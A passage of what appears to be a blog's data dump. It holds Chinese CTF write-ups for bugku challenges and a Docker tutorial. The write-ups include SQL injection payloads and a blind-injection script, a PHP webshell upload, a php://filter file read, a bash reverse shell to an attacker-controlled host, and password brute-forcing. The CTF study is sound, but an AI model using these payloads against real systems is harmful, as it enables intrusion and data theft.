requests.get(url + payload.format(str(length),i)).text.encode('latin-1').decode('gb2312')\n\t\tif yes in res:\n\t\t\t# table_name += i\n\t\t\tcolumn_name += i\n\t\t\tlength += 1\n\t\t\tprint(column_name)\n\t\t\tbreak\n\t\tif i == '@':\n\t\t\tprint('aaaaaaaaaaaaaaaaaaaaaa')\n# admin,idnuenna\n```\n\n# 猫抓老鼠\n\n脑洞题，注意题目响应头 `Content-Row: MTUyODYyMjkxMQ==` 直接把这个内容提交验证即可。。\n\n# 头有点大\n\n打开后看到有如下要求\n\n> You don't have permission to access / on this server.\nPlease make sure you have installed .net framework 9.9!\nMake sure you are in the region of England and browsing this site with Internet Explorer\n\n第一个本题好像实际上并没有限制，第二个可以通过修改user-agent字段，修改为\n\n```\n: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 9.9; .NET CLR 3.5.30729; rv:11.0) like Geckog \n```\n\n第三个要求来自英国，可以通过修改accept-language字段的值\n\n```\nen-gb;q=0.8\n```\n\n","tags":["CTF"],"categories":["writeup"]},{"title":"Docker简介与简单页面搭建","url":"/2018/04/20/docker1/","content":"\n# Docker简介\n\n最近要和同学做一个PHP项目需要用到docker，正好也对这个东东挺好奇的，顺便来学习一波，何为docker呢？docker的本质其实就是容器，类似于虚拟机，但是又比虚拟机更加小巧，容器技术是基于linux的内核特性(Namespace和Cgroups)的一项技术，所以在其上只能运行类linux系统而不能运行Windows系统，使用虚拟机部署文件时既需要应用和应用依赖的库，还需要完整的操作系统，但是容器的话则只需要应用和应用依赖的库即可，但是在docker之前容器的应用并不广泛，原因在于容器的自动化程度不高，部署复杂，而docker的出现则弥补了这些缺点，所以能够得到业界广泛的使用。\n\n<!--more-->\n\n![](docker1/1.jpg)\n\n# Docker安装\n\n## 安装前检查\n\n1. 内核版本(具体支持哪些版本可以在官网查看)\n\n```\nuname -a\n```\n\n如果内核不支持可以升级内核\n\n2. 检查Device Mapper(存储驱动)\n\n```\nls  -l /sys/class/misc/device-mapper\n```\n\n查看文件是否存在\n\n## 安装Docker\n\n安装Docker有两种可用的版本，一种是Ubuntu维护的版本，一种是Docker维护的版本，推荐安装Docker维护的版本，因为它的版本较新，安装步骤官方已经编写成一个脚本，可以非常简单的安装，我们只需要下载这个脚本并运行即可，\n\n### Ubuntu\n\n试了好多种方法才安装好，最后还是用了官方推荐的方法，我的版本号如下\n\n> Linux ubuntu 4.10.0-37-generic #41-Ubuntu SMP Fri Oct 6 20:20:37 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux\n\n由于在公共镜像仓库拉取镜像需要https协议，需要对于组件的安装。\n\n```\napt-get install curl\napt-get install ca-certificates\napt-get install software-properties-common\n```\n\n```\napt-get install  apt-transprt-https \n```\n\n安装不顺利，报错：Unable to locate package apt-transprt-https，需要单独下载安装包及依赖包\n\n```\nwget http://ftp.nl.debian.org/debian/pool/main/a/apt/apt-transport-https_1.4.8_amd64.deb\ndpkg -i apt-transport-https_1.4.8_amd64.deb\nwget http://ftp.nl.debian.org/debian/pool/main/a/apt/libapt-pkg5.0_1.4.8_amd64.deb\ndpkg -i libapt-pkg5.0_1.4.8_amd64.deb\n```\n\n添加 Docker 官方的 GPG key\n\n```\ncurl -fssl https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -\n```\n\n将 Docker 的源添加到 /etc/apt/sources.list\n\n```\nadd-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\"\n```\n\n更新一下镜像\n\n```\napt-get update\n```\n\n安装docker\n\n```\napt-get install docker-ce\n```\n\n开启docker守护进程\n\n```\nsudo service docker start\n```\n\n运行第一个容器，输出‘hello world’\n\n```\nsudo docker run centos echo 'hello world'\n```\n\n### CentOS\n\n执行安装脚本\n\n```\nsudo apt-get update\n```\n\n```\ncurl -fsSL https://get.docker.com/ | sh\n```\n\n安装完成后查看版本信息\n\n```\nsudo docker version\n```\n\n开启docker守护进程\n\n```\nsudo service docker start\n```\n\n运行第一个容器，输出‘hello world’\n\n```\nsudo docker run centos echo 'hello world'\n```\n\n以上命令都只是在root权限下运行，如果要在非root权限下运行，则需要将当前用户添加进去docker用户组中\n\n```\nsudo groupadd docker\n```\n\n```\nsudo gpasswd -a charles docker\n```\n\n之后重启docker服务\n\n```\nsudo service docker restart\n```\n\n注销当前账户再重新登录即可运行docker命令啦！\n\n```\ndocker version\n```\n\n### Windows\n\nWindows安装比较简单，到网址下载之后按照要求安装即可\n\n![](docker1/2.jpg)\n\n# Docker的基本操作\n\n## 启动容器\n\n```\ndocker run centos echo 'hello world'\n```\n\n在输出hello world之后镜像也就关闭了，无法交互\n\n## 启动交互式容器\n\n```\ndocker run -i -t IMAGE /bin/bash\n```\n\n> -i: --interactive=true|默认是false，为容器始终打开标准输入\n> -t: --tty,为容器分配一个伪tty终端\n\n退出交互shell使用 `exit` 命令\n\n## 查看容器\n\n```\ndocker ps [-a] [-l]\n```\n\n> -a: all\n> -l: latest\n\n```\ndocker inspect 容器唯一ID或名字\n```\n\n该命令可以查看容器的详细信息\n\n**定义容器名字**\n\n```\ndocker run --name=container01 -i -t ubuntu /bin/bash\n```\n\n## 重新启动停止的容器\n\n```\ndocker start -i 容器名或ID\n```\n\n## 删除容器\n\n```\ndocker rm ..\n```\n\n注意： 只能删除已经停止的容器\n\n# 守护式容器\n\n> 能够长期运行\n没有交互式会话\n适合运行应用程序和服务\n\n以守护形式运行容器\n\n以下列命令打开一个容器\n\n```\ndcoker run -i -t ubuntu /bin/bash\n```\n\n但是并不以exit命令退出而是以 `ctrl P+Q`退出，这样容器就会在后台运行\n\n可以使用 `docker ps -a` 来查看容器状态可以发下容器确实在后台运行\n\n使用attach命令再次进入容器\n\n```\ndocker attach 容器ID\n```\n\n使用 `exit` 命令即可退出容器\n\n启动守护式容器最重要的方式\n\n```\ndocker run -d 镜像名 [command]\n```\n\n*********************\n\n我们来启动一个守护式容器\n\n```\ndocker run --name dc1 -d ubuntu /bin/sh -c \"while true;do echo 'hello world'; sleep 1; done\"\n```\n\n容器在后台运行，可以使用日志来查看执行情况\n\n```\ndocker logs -tf --tail 0 dc1\n```\n\n参数的具体含义可在帮助文档中查看\n\n除了使用logs之外，还可使用进程命令\n\n```\ndocker top dc1\n```\n\n在已经运行的容器中启动新的进程\n\n```\ndocker exec [-d] [-i] [-t] 容器名 [command]\n```\n\n关闭守护式容器有两种方法\n\n```\ndocker stop dcname\n```\n\n```\ndocker kill dcname\n```\n\nstop命令会等待容器执行完毕后关闭容器，而kill则会直接关闭容器。\n\n****************\n\n具体想要查看更多命令的相关情况可以使用man命令\n\n```\nman docker-run\nman docker-top\n...\n```\n\n# 在docker容器中部署静态网站\n\n1. 设置容器的端口映射\n\n```\nrun -p|-P\n```\n\n> -P: 对容器所有的端口进行映射\n-p: 指定映射哪些容器的端口\n\n![](docker1/3.jpg)\n\n2. 开始部署\n\n先运行一个带端口映射的容器\n\n```\ndocker run -i -t --name web -p 80 ubuntu /bin/bash\n```\n\n进入容器之后安装Nginx\n\n```\napt-get update\napt-get install -y nginx\n```\n\n接下来安装vim，用来编辑网页文件和配置文件\n\n```\napt-get install -y vim\n```\n\n新建一个工作目录\n\n```\nmkdir -p /var/www/html\n```\n\n切换到工作目录下,编辑一个静态页面\n\n```\ncd /var/www/html\nvim index.html\n```\n\n具体编辑过程省略，接下来编辑Nginx配置文件\n\n查找一下Nginx文件的位置\n\n```\nwhereis nginx\n```\n\n查看文件目录\n\n```\nls /etc/nginx\n```\n\n```\nls /etc/nginx/sites-enabled\n```\n\n可以看到有个default文件，修改该文件\n\n将root的值改为刚才创建的文件目录\n\n> root: /var/www/html\n\n这样，配置就完成了，切换回根目录,运行Nginx\n\n```\ncd /\nnginx\n```\n\n可以使用ps命令查看nginx是否已经运行\n\n```\nps -ef\n```\n\n可以看到命令已经运行了,还可以查看到端口号，然后用Ctrl+P+Q退出\n\n然后访问静态页面\n\n```\ncurl http://127.0.0.1:port\n```\n\n我们也可以用容器的IP地址来访问\n\n```\ndocker inspect web\n```\n\n可以看到容器ip地址和映射端口\n\n> \"IPAddress\": \"172.17.0.2\"\n\"HostPort\": \"32768\"\n\n访问\n\n```\ncurl http://172.17.0.2\n```\n\n这就不需要指定端口号了，用默认的80端口即可\n\n我们停止该容器\n\n```\ndocker stop web\n```\n\n然后在打开该服务\n\n运行 `ps -ef` 可以看到并没有开启Nginx服务\n\n这是退出容器\n\n然后用exec命令开启Nginx服务\n\n```\ndocker exec web nginx\n```\n\n```\ndocker top web\n```\n\n可以看到Nginx服务已经开启，但是这是不能用前面的ip地址访问，因为容器映射的地址已经改变，需要重新查看地址映射才能访问\n\n至此，简单搭建静态页面完成。\n\n# Docker镜像操作\n\n镜像是容器构架的基石，接下里介绍一下如何查看和删除镜像\n\n```\ndocker images [OPTIONS] [REPOSITORY]\n\t-a,--all=false\n\t-f,--filter //过滤条件\n\t--no-trunc=false //以非截断方式显示镜像信息，默认关闭\n\t-q,--quiet=false \n```\n\n```\ndocker images centos\n```\n\n返回docker中对应的centos镜像\n\n**********************\n\n查看镜像\n\n```\ndocker inspect [OPTIONS] CONTAINER|IMAGE [CONTAINER|IMAGE...]\n\t-f,--format=\"\"\n```\n\n删除镜像\n\n```\ndocker rmi [OPTIONS] IMAGE\n\t-f,--force=false //强制删除\n\t--no-prune=false //保留镜像中未打标签的父镜像\n```\n\n\n# 获取和查找镜像\n\n## 查找镜像\n\n- Docker Hub\n\n> 在官方网站上进行搜索\n\n- docker search [OPTIOINS] TREM\n\t--automated=false Only show automated builds\n\t--no-trunc=false Don't truncate output\n\t-s,--stars=0 Only displays with at least stars\n\n**EXAMPLE:** \n\n```\ndocker search ubuntu \n```\n\n## 获取和推送镜像\n\n***拉取镜像***\n\n```\ndocker pull [OPTIONS] NAME [:TAG]\n\t-a,--all-tags=false Download all tagged images in the respository\n```\n\nEXP:\n\n```\ndocker pull ubuntu:14.04\n```\n\n这个命令拉取镜像的速度不是非常可观，这是因为站点在国外的原因，可以通过设置国内镜像源来提高下载速度\n\n在 `daocloud` 上注册账户，点击加速器，复制命令在自己的主机上执行即可发现再拉取镜像是速度明显提高\n\n***推送镜像***\n\n```\ndocker push NAME[:TAG]\n```\n\n# 构建镜像\n\n构建镜像可以帮我们保存对容器的修改，方便再次使用；同时也可以自定义镜像，还可以以软件的形式打包并分发服务及运行环境\n\n## 使用commit来构建镜像\n\n创建一个镜像\n\n```\ndocker run -it -p 80 --name commit_test ubuntu /bin/bash\n```\n\n提交镜像\n\n```\ndocker commit -a 'charles' -m 'nginx' 仓库名\n```\n\n## 使用dockerfile创建镜像\n\n自行百度，略\n\n# Docker守护进程的配置与操作\n\n## 查看守护进程\n\n```\nps -ef|grep docker\nsudo status docker\n```\n\n## Docker守护进程的停止开始\n\n```\nsudo service docker stop|start|restart \n```\n\nDocker配置被修改后需要重启才能够生效\n\n## Docker的启动配置文件(配置docker的启动信息)\n\n文件位置\n\n> /etc/default/docker\n\n利用该文件可以修改docker的各种启动配置信息\n\n# Docker的远程访问\n\n## 环境准备\n\n> 第二台安装docker的服务器\n修改docker守护进程的启动选项以区别服务器\n保证client API与server API版本一致\n\n\n# Dcoker的容器卷管理\n\n1. 直接指定文件\n\n```\ndocker run -it -v ~/datavolume:[ro]/data[:ro] ubuntu /bin/bash\n```\n\n> /datavolumn指定源文件位置如果文件不存在则会自动创建，/data指定docker文件中的文件位置，[ro]指定文件访问权限\n\n\n2. 创建dockerfile\n\n\n# Docker容器互联\n\n分别演示三部分\n\n> 允许所有容器互联(默认)；拒绝容器间互联；允许特定容器间的连接\n","tags":["docker"],"categories":["资料"]},{"title":"bugku-writeup续","url":"/2018/04/03/bugku-writeup续/","content":"\n# 杂项\n\n## 账号被盗了\n\n<!--more-->\n\n先修改浏览器cookie获取，之后可以获得一个可执行文件，是cf的一个刷枪客户端，wireshark抓取一下这个客户端的访问包，可以得到\n\n> AUTH LOGIN\n334 VXNlcm5hbWU6\nYmtjdGZ0ZXN0QDE2My5jb20=\n334 UGFzc3dvcmQ6\nYTEyMzQ1Ng==\n\n这些base64是用户名和密码，登录邮箱即可获得flag，由于邮箱的flag已经被删除了，所以这里附上flag\n\n```\nflag{182100518+725593795416}\n```\n\n## 爆照(08067CTF)\n\nbinwalk一下发现图面里面隐藏了很多东西，分解一下，得到很多没有后缀名的文件，这题比较坑的地方就是我不知道这些文件都是可以打开的图片，文件88里面包含了一个二维码，扫描一下即可，得到第一段；888文件修改一下后缀名为jpg即可查看一个备注信息是一段base64编码，解码得到第二段值；8888里面隐藏了一张二维码，分解扫码即可得到第三段，拼接即可得到flag\n\n## 妹子的陌陌\n\n上来先binwalk一下看一下，发现还包含一个RAR文件，解压文件发现有密码，查看图片发现图片上有 `喜欢我吗.` 字样，猜测这就是密码，解压成功后得到一段文本，有一段摩斯密码，解密一下发现是一个解密网站，文本又提示是aes解密，利用题目的密钥解密即可得到一个新的图片地址，访问该图片发现是一个二维码，但是黑白反相了，用PS处理一下（图像->调整->反相）      \t\t\t\t\t\t\t\t\t \t\t\t\t\t\t\t\t\t\t \n## 听首音乐\n\n音频隐写题目，用Audacity打开可以看到第一行，放大后发现像是摩斯密码，依次写出来解密一下即可，但是注意一定要是大写，小写不行。\n\n## 好多数值\n\n这些数值是像素点，我们要做到就是把它们重新合成图像，根据像素点个数能够求出可能的图像的规格。\n\n```python\nfrom PIL import Image\n\n# 可能的图片大小\n# (1006 , 61)\n# (503 , 122)\n# (122 , 503)\n\nwith open('1.txt','r') as file:\n\tx = 503\n\ty = 122\n\tim = Image.new('RGB',(x,y))\n\tfor i in range(x):\n\t\tfor j in range(y):\n\t\t\tline = file.readline()\n\t\t\trgb = line.split(',')\n\t\t\tim.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))\nim.show()\n```\n\n## convert\n\n题目给出了一堆二进制数，照常先转为16进制，发现前六位是 `526172`，查找资料可知这是RAR文件的文件头，所以导出RAR文件，解压查看图片属性即可看到一段base64，解码即可得到flag\n\n```python\ns = '''\n0101001001100001011100100010000100011010000001110000000011001111100100000111001100000000000000000000110100000000000000000000\n'''\n# 这里输入二进制全文，这里只有删除了大部分的内容\n\nb = hex(int(s,2))\na = '52172211a0700cf907300000d00000000000000f7c07420902c000d09000059220000023e6370190a59b34a1d330700200000006b65792e6a70670'\n# 16进制全文，注意删除前面的0x字段\n\nwith open('1.rar','wb') as file:\n\tfile.write(a.decode('hex'))\n\n```\n\n## 好多压缩包\n\n下载之后是一堆压缩包，发现都有密码，打开之后看到有crc校验值，应该就是CRC32碰撞\n\n```python\n#coding:utf-8\nimport zipfile\nimport string\nimport binascii\n\ndef CrackCrc(crc):\n    for i in dic:\n        for j in dic:\n            for p in dic:\n                for q in dic:\n                    s = i + j + p + q\n                    if crc == (binascii.crc32(s) & 0xffffffff):\n                        f.write(s)\n                        return\n\ndef CrackZip():\n    for I in range(68):\n        file = '123/out' + str(I) + '.zip'\n        f = zipfile.ZipFile(file, 'r')\n        GetCrc = f.getinfo('data.txt')\n        crc = GetCrc.CRC\n        CrackCrc(crc)\n\ndic = string.ascii_letters + string.digits + '+/='\nf = open('out.txt', 'w')\nCrackZip()\nf.close() \n```\n\n打开之后可以看到是一段base64，解码之后虽然部分是乱码，但是还可可以看到部分内容 <code>fix the file and get the flag</code> ，意思就是让我们修复这个文件，把解码后的内容导入到文件中，查看一下十六进制发现结尾是rar的文件尾部，推测这是RAR文件，则把文件头补齐一下，解压之后还是没有flag，于是再次查看压缩包，在注释里面找到了flag，（文件十六进制值里面有一个CMT字段，说明RAR文件存在注释）\n\n## 一个普通的压缩包(xp0intCTF)\n\n文件下载之后是个RAR文件，解压之后是个flag.txt，但是里面内容没有flag，所以重点应该还是在这个压缩包，网上看了别人的思路是修改了文件的十六进制值部分改为 `A8 3C 74` ，这样再次进行解压即可解压出一个png图片，但是查看十六进制值发现前缀是GIF前缀，修改后缀为GIF，在ps中有两个图层，再把这两个图层分别保存为gif文件，之后再用stegsolve查看即可看到二维码，分别保存，再在ps中上下拼接成二维码，坑点在于拼接之后的二维码还需要修复一下：将下面的图片下面的左半部分拼接左上角，另外还要讲左半部分的定位快在拼接到右上角的空块中。\n\n## 就五层你能解开吗\n\n根据提示第一层是crc32碰撞，可以看到压缩包的3个txt文件都是6字节，所以猜测应该是用这三个TXT文件的crc32校验值来做。用github上的一个项目来做一下\n\n```\npython crc32.py reverse 0x4dad5967\n```\n\n得到\n\n> 4 bytes: {0x1b, 0xd6, 0x38, 0xc2}\nverification checksum: 0x4dad5967 (OK)\nalternative: 9rNYn3 (OK)\nalternative: Ay8sZC (OK)\nalternative: QHSaFX (OK)\nalternative: TmQA5n (OK)\nalternative: VQT_ls (OK)\nalternative: X28BT9 (OK)\nalternative: \\_GLQzV (OK)\nalternative: goMEPt (OK)\nalternative: nyUKFQ (OK)\nalternative: t\\_s4f3 (OK)\nalternative: xQxVkx (OK)\nalternative: yQ9gpa (OK)\n\n把三个校验码都跑一下，然后提取其中相对有意义的结果拼起来可以得到解压密码 `_CRC32_i5_n0t_s4f3` ，第一层解开！\n\n第二层是维吉尼亚密码，题目给出了近一万条密钥，直接暴力破解肯定是不可能的，但是我们发现密文第一个单词为 `rla` 只有三个字母，我们可以推测这三个字母的含义，我想了几个可能的情况\n\n|明文|密文|密钥|\n|:-:|:-:|:-:|\n|the|rla|yew|\n|she|rla|zee|\n|you|rla|txq|\n|key|rla|hhc|\n\n查表发现只有第一个可以找到对应密钥，尝试解密一下\n\n> the vigenere cipher is a method of encrypting alphabetic text by using a series of different caesar ciphers based on the letters of a keyword it is a simple form of polyalphabetic substitution so password is vigenere cipher funny\n\n语义通顺，应该就是这个，用密钥尝试解压缩包，成功，第二层解开！\n\n第三次sha1碰撞，继续上脚本\n\n```python\nimport string\nimport hashlib\n\nkeys = string.ascii_letters + string.digits + string.punctuation\n\ndef sha1(s):\n    sha1_hash = hashlib.sha1()\n    sha1_hash.update(s)\n    return sha1_hash.hexdigest()\n\nfor i in keys:\n\tfor j in keys:\n\t\tfor p in keys:\n\t\t\tfor q in keys:\n\t\t\t\tpassword = i + '7' + j + '5-' + p + '4' + q + '3?' \n\t\t\t\tsha = sha1(password.encode('utf-8'))\n\t\t\t\tif sha[0:7] == '619c20c' and sha[8] == 'a' and sha[16] == '9':\n\t\t\t\t\tprint(password)\n```\n\n得到密码 `I7~5-s4F3?` ，第三次解开！\n\n第四层要求两个exe文件md5值相同但是输出不同，网上查找了一下还真的是有，一个文件输出 `Hello World ;-)` ,另一个输出 `Goodbye World :-(` ，以此为密码即可解开\n\n第五层折腾了好久，RSA题目做的太少了，用openssl打开ssl文件看一下\n\n```\nopenssl rsa -pubin -in rsa_public_key.pem -text -modulus\n```\n\n可以看到e很大，也就是指数很大，网上找了一下有个wienerattack攻击，用脚本跑一下可以得到d\n\n> 8264667972294275017293339772371783322168822149471976834221082393409363691895\n\n那么接下来就是生成私钥了，github上有个ctftool可以生成私钥\n\n```\npython rsatool.py -f PEM -o key.pem -n 46065780722597 -d 826466 -e 3546\n```\n\nPS：篇幅所限，数字我都缩小了\n\n然后利用生成的私钥解密\n\n```\nopenssl rsautl -decrypt -in flag.enc -inkey key.pem -out 1.txt\n```\n\n然后即可得到flag。\n\n# web\n\n## 文件上传2\n\n这个题目有点难，找了半天的资料，刚开始什么也没有，查看元素发现有个 <code>upload.php</code>，打开发现只能上传图片，试了各种方法都没有用，最后百度了一下找到了方法，直接上传jpg文件，内容如下:\n\n```\n<script language=\"php\"> system($_REQUEST[a])</script>\n```\n\n发现成功上传，传递参数\n```\n?file=upload/201803160110346459.jpg&a=ls\n```\n\n有个txt文件，查看一下\n```\n?file=upload/201803160110346459.jpg&a=cat this_is_th3_F14g_154f65sd4g35f4d6f43.txt\n```\n\n如此可得到flag\n\n## flag.php\n\n点了确实没反应，看了提示是 <code>hint</code>，原来是要get一个hint参数为1， <code>?hint=1</code>，即可得到源代码，审计一下，只要使cookie中的ISecer的反序列化值与**<font face=\"futura\">$EKY</font>**的反序列化全等即可。但要注意的是$KEY在序列化之前，即<code>$KEY=''</code>，序列化为 <code>s:0:\"\"</code>\n\n## 报错注入\n\n题目主要过滤了空格，可以用 <code>/\\*\\*/</code>绕过，这里介绍个 <font face=\"futura\">load\\_file(filename)</font>可以查看文件，然后慢慢截取即可\n\n```\nid=1/**/and/**/updatexml(1,concat(0x7e,(concat(substr(load_file(0x2F7661722F746573742F6B65795F312E706870),100,30))),0x7e),1)\n```\n\n但是有一个地方贼坑，就是提交flag时的引号，一定要用题目里面要求的引号，不是英文的引号！！！\n\n## sql注入2\n\n发现文件泄露，访问flag即可(贼几把坑)\n\n## 文件上传2(湖湘杯)\n\n这道题目没做出来，每次做文件上传类题目的时候总是没思路，这次看了别人的思路，直接文件读取居然就可以了。\n\n```\nhttp://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag\n```\n\n## 孙xx的博客\n\n扫描旁站发现一个PHPmyadmin，查看博客内容\n\n> MySQL数据库用户名 \ndefine('DB_USER', 'wp');\n\n MySQL数据库密码 \ndefine('DB_PASSWORD', 'wzTrzYRdbrbyjAx'); \n\n登录即可找到flag\n\n## login(SKCTF)\n\n题目提示是SQL布尔盲注，username字段过滤了空格等常用字符，还有逻辑符号等，新学到一个**<font face=\"futura\">mid()</font>**函数，可以绕过for和逗号\n\n```\nusername=admin'^(ascii(mid((password)from(1)))<>55)^0#&password=123\n```\n\n直接上脚本即可\n\n```python\nimport requests\n\nurl = \"http://118.89.219.210:49167/\"\npayload = ''\ndata = {'username':payload,'password':'123'}\nflag_yes = 'error'\nflag = ''\nstart = 1\nend_signal = True\nwhile(end_signal):\n\tend_signal = False\n\tfor j in range(33,127):\n\t\tpayload = \"admin'^(ascii(mid((password)from({})))<>{})^0#\".format(str(start),str(j))\n\t\tdata['username'] = payload\n\t\tres = requests.post(url,data=data).text\n\t\tif flag_yes in res:\n\t\t\tflag += chr(j)\n\t\t\tprint(flag)\n\t\t\tstart += 1\n\t\t\tend_signal = True\n\t\t\tbreak\n```\n\n**注意：**解出后的密码要md5解密，怪我太年轻。\n\n## PHP_encrypt_1(ISCCCTF)\n\n这个题目应该是有漏掉东西，没有给出加密后的密文，网上找一下密文，反向破解即可，贴上代码\n```python\n# python3\n\nimport base64\nimport hashlib\n\ncipher = 'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='  # 题目中应该给出的密文串\n\nplain = base64.b64decode(cipher)\nplain = plain.decode('unicode-escape')\nplain1 = ''\n\n# 构造题目中的md5串\nm = hashlib.md5()\nm.update(b'ISCC')\nkey = m.hexdigest()\nchar = ''\nx = 0\nfor i in range(len(cipher)):\n\tif x == len(key):\n\t\tx = 0\n\tchar += key[x]\n\tx += 1\n\nnumflag = []    # 明文ascii码值\n\ndef Is_OK(number):\n\tif number >= 33 and number < 127:\n\t\treturn True\n\telse:\n\t\treturn False\n\nfor i in range(len(plain)):\n\tfor j in range(2):\n\t\ttmp = 128 * j + ord(plain[i]) - ord(char[i])\n\t\tif Is_OK(tmp):\n\t\t\tnumflag.append(tmp)\n\t\t\tbreak\n\t\tcontinue\n\nfor i in numflag:\n\tprint(chr(i),end=\"\")\n```\n\n## login2(SKCTF)\n\n这题纯学习姿势，先正常发送请求，抓包发现提示是 <code>tips</code>，base64解码，是一段php代码\n```php\n$sql=\"SELECT username,password FROM admin WHERE username='\".$username.\"'\";\nif (!empty($row) && $row['password']===md5($password)){}\n```\n\n题目也提示了union绕过，payload\n\n```\nusername=1' union select md5(1),md5(1)#&password=1\n```\n\n如此即可绕过，登录后是个命令执行，接下来开始重要姿势！！！！\n\n**反弹shell**\n\n你的linux主机上监听一下端口\n\n```\nnc -lvv 8888\n```\n\n然后执行命令\n\n```\n|bash -i >& /dev/tcp/你的ip地址/8888 0>&1\n```\n\n如此即可成功反弹到shell!!!!(233333)\n\n然后读文件即可\n\n![](bugku-writeup续/1.png)\n\n# 代码审计\n\n## md5加密相等绕过\n\npayload\n```\n?a=240610708\n```\n\n## ereg正则%00截断\n\n好坑啊，提交了一个 <code>?password=9e9%00-</code>老是不对，没想到居然是 <code>?password=9e9%00\\*-\\*</code>,哎，扎心了...\n\n## extract变量覆盖\n\n比较简单，payload\n```\n?shiyan=flag&flag=php://input\nflag\n```\n\n第二行以post方式提交\n\n## urldecode二次编码饶过\n\n题目关键点在于，**<font face=\"futura\">$\\_GET[]</font>**会先对得到的参数进行一次url解码，然后在函数中又进行了一次解码，所以会产生二次编码漏洞。\n```\n?id=%2568%2561%2563%256B%2565%2572%2544%254A\n```\n二次编码后提交即可。\n\n## md5函数\n\n直接提交数组即可\n\n## sha函数比较绕过\n\n还是提交数组即可\n\n## 十六进制与数字比较\n\n直接提交16进制数字即可。\n\n## strpos数组绕过\n\n还是数字绕过 <code>?ctf[]=1234</code>\n\n# 杂项\n\n## 眼见非实(ISCCCTF)\n\n看到文件名是个zip，改后缀名为zip打开，解压后发现是个doc文件，但是带不开，看一下16进制发现 <code>504b0304</code>的开头，所以应该是一个zip文件，在改后缀为zip解压，找出flag即可。\n\n## 又一张图片，还单纯吗\n\nbinwalk跑一下发现有两个图片，切一下即可\n```\nfalg{NSCTF_e6532a34928a3d1dadd0b049d5a3cc57}\n```\n\n## 宽带信息泄露\n\n百度可知bin后缀为路由器备份文件，有routepassview打开找username字段即可。\n\n## 隐写2\n\nbinwalk跑一下即可，之后得到一个压缩包，需要密码，但是密码只有三位数，暴力破解即可密码871，然后16进制打开，在末尾即可得到flag，花括号内还要base64解码，注意吧flag的@换成a，这是一个坑。\n\n## linux\n\n直接解压，然后有个flag文件，hex里面找一下key即可。\n\n## 中国菜刀\n\n下载后是个数据流文件，wireshark查看一下，由于是菜刀连接，所以只需要查看http协议即可，在第四个http协议里面发现了一句话木马，所以猜测数据传输应该在这之后，追踪一下http流，发现一段base64代码，解之\n```php\n@ini_set(\"display_errors\",\"0\");\n@set_time_limit(0);\nif(PHP_VERSION<'5.3.0'){\n\t@set_magic_quotes_runtime0);\n};\necho(\"X@Y\");\n$F='C:\\\\wwwroot\\\\3.php';\n$P=@fopen($F,'r');\necho(@fread($P,filesize($F)));\n@fclose($P);;echo(\"X@Y\");die();\n```\n\n这应该是打开某个文件，开头和末尾都是 <code>X@Y</code>,查看下一个http流\n\n![](bugku-writeup续/2.png)\n\n这应该就是传输的文件，查看一下分组字节，然后把前后的X@Y去掉，解码为压缩形式即可得到flag\n\n## 这么多数据包\n\n这个题不是很理解，数据流审计还很菜，这里记录一下别人的解法，观察tcp可以看出从104个包开始攻击机开始扫描目标机，在以5542开始的包就已经getshell，所以追踪一下tcp流，发现有个txt文件，有一段base64，解码即可得到flag、\n\n## 隐写3\n\n改变图片高度即可\n\n## 想蹭网先解开密码\n\n这个题不是很理解工具怎么使用，WiFi不是很了解，写一个字典出来，工具跑一下，命令如下\n\n```\naircrack-ng wifi.cap -w passwd.txt \n```\n\n![](bugku-writeup续/3.png)\n\n## linux2\n\n下载文件，先是binwalk了一下，发现一个图片，还有一个图片，图片是一个flag内容，然而并不对，看了比人的wp才知道了正解，没必要binwalk直接跑一下命令即可\n\n```\nstrings brave > a.txt\n```\n\n然后在a.txt中搜索一下 <code>key</code>，直接出现了flag\n\n## 账号被盗了\n\n这题不会...\n\n## 聪明的大象\n\n解压图片发现备注栏有一段base64，再看图片大小6M多，应该是加了东西，binwalk跑一下，切出来一个解压包，密码就是刚刚的base64，解之是一张图片，是以前的一道题，改变高度即可得到flag\n\n# web进阶\n\n## 实战2-注入\n\n打开后发现news页面有id参数，加引号可以报错注入\n```\n?id=18 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 21,1),0x7e),1)\n```\n\n## Trim的日记本\n\n扫描目录，发现有一个 <code>show.php</code>进入即可得到flag！！！！不过不知道是不是正解。\n\n# 社工\n\n## 社工进阶\n\n百度搜索孤长离发现有个贴吧，里面有个邮箱，尝试弱口令登录，百度top100弱口令，第二个就是了 <code>a123456</code>\n\n## 信息查找\n\n直接百度 <code>bugku.cn 今日头条</code>，第一个结果的群号即可。\n\n## 简单个人信息收集\n\n首先下载到一个压缩包，发现是伪加密，破解之，然后在上社工库查询一下即可。\n\n## 简单的社工尝试\n\ngoogle识图，然后有一个github相关的页面，点进去之后有一个微博链接，进去之后有个图片，打开图片中的链接即可。\n\n# 加密\n\n## 简单加密\n\n凯撒移位，代码\n\n```python\ncipher = 'e6Z9i~]8R~U~QHE{RnY{QXg~QnQ{^XVlRXlp^XI5Q6Q6SKY8jUAA'\n\nfor i in range(-70,32):\n\tfor j in cipher:\n\t\t# print(ord(j)+i)\n\t\tif (ord(j)+i) > 132 or (ord(j)+i) < 33:\n\t\t\tbreak \n\t\tprint(chr(ord(j)+i),end=\"\")\n\tprint('\\n')\n\n```\n\n## 一段base64\n\n多层解码，贴上代码:\n\n```python\nimport base64\nimport re\nimport string\nfrom urllib import parse\n\nwith open('base64.txt') as file:\n\t# base64解码\n\ttext = file.read()\n\ttext = base64.b64decode(text)\n\ttext = text.decode('utf-8')\n\talp = re.findall(r'([0-7]+)',text)\n\t\n\t# base64解码后发现像8进制，8进制转换成10进制\n\tnew_alp = []\n\tfor item in alp:\n\t\tnew_alp.append(int(item,8))\n\t\n\t# ascii解码\t\n\talp = ''\n\tfor i in new_alp:\n\t\talp += str(chr(i))\n\n\t# 前面的解码后为'\\xdd'的形式，推测为16进制\t\n\tplain = ''\n\tcipher = re.findall(r'\\\\x([0-9a-f]+)',alp)\n\tfor i in cipher:\n\t\tplain += str(chr(int(i,16)))\n\n\t# 